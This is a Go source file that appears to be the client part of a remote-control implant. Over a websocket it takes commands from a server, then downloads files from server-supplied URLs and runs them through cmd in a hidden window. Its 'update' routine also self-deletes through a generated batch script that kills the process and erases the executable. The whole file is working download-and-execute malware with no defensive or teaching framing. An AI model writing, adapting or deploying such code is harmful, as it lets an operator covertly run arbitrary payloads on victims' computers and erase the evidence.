package miscs

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"github.com/gorilla/websocket"
	"golang.org/x/exp/rand"
)

const letterBytes = "abcdefghijklmnopqrstuvwxyz0123456789"

func randomString(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Int63()%int64(len(letterBytes))]
	}
	return string(b)
}

func SendMessageAndReceive(c *websocket.Conn, message string) {
	err := c.WriteMessage(websocket.TextMessage, []byte(message))
	if err != nil {
		log.Printf("WriteMessage error: %v", err)
		return
	}
	log.Printf("Sent ping ")

	_, response, err := c.ReadMessage()
	if err != nil {
		log.Printf("ReadMessage error: %v", err)
		return
	}
	log.Printf("Received: %s", response)
	formatted := strings.Split(string(response), "|")
	switch formatted[1] {
	case "EMPTY":
		return
	case "download":
		download(formatted[2])

	case "update":
		update(formatted[2])

	}
}

func download(downloadlink string) {
	parsedURL, err := url.Parse(downloadlink)
	if err != nil {
		return
	}

	path := parsedURL.Path
	extension := filepath.Ext(path)

	client := &http.Client{}
	req, _ := http.NewRequest("GET", downloadlink, nil)

	tempDir := os.TempDir()

	fileName := randomString(16) + extension
	filePath := filepath.Join(tempDir, fileName)

	file, _ := os.Create(filePath)
	defer file.Close()

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return
	}
	io.Copy(file, resp.Body)

	Exec := exec.Command("cmd", "/C", filePath)
	Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	Exec.Start()

}

func selfDestruct() error {
	executablePath, err := os.Executable()
	if err != nil {
		return err
	}

	batchScriptPath := filepath.Join(os.Getenv("TEMP"), "/self_destruct.bat")

	batchScriptContent := fmt.Sprintf(`@echo off
timeout /t 3 > nul
echo Terminating parent process...
taskkill /f /pid %d > nul
echo Deleting executable...
del /f "%s"
exit`, os.Getpid(), executablePath)

	err = os.WriteFile(batchScriptPath, []byte(batchScriptContent), 0700)
	if err != nil {
		return err
	}

	cmd := exec.Command("cmd", "/C", batchScriptPath)
	err = cmd.Start()
	if err != nil {
		return err
	}

	os.Exit(0)
	return nil
}

func update(downloadlink string) {
	parsedURL, err := url.Parse(downloadlink)
	if err != nil {
		return
	}

	path := parsedURL.Path
	extension := filepath.Ext(path)

	client := &http.Client{}
	req, _ := http.NewRequest("GET", downloadlink, nil)

	tempDir := os.TempDir()

	fileName := randomString(16) + extension
	filePath := filepath.Join(tempDir, fileName)

	file, _ := os.Create(filePath)
	defer file.Close()

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return
	}
	io.Copy(file, resp.Body)

	Exec := exec.Command("cmd", "/C", filePath)
	Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	Exec.Start()
	selfDestruct()

}
